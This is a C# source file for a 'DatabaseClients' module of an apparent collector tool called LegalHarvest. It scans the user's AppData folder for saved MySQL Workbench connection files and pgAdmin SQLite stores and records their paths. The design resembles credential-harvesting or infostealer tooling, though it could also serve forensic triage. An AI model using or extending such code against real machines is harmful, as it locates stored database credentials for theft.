using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class DatabaseClientsModule : ICollectorModule
    {
        public string ModuleName => "DatabaseClients";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            // MySQL Workbench
            string wbDir = Path.Combine(appData, "MySQL", "Workbench");
            if (Directory.Exists(wbDir))
                foreach (string file in Directory.GetFiles(wbDir, "connections.xml", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "MySQLWorkbench", Name = "Connections", Value = file, Timestamp = DateTime.Now });

            // pgAdmin
            string pgAdminDir = Path.Combine(appData, "pgAdmin");
            if (Directory.Exists(pgAdminDir))
                foreach (string file in Directory.GetFiles(pgAdminDir, "*.sqlite", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "pgAdmin", Name = file, Value = file, Timestamp = DateTime.Now });

            return items;
        }
    }
}
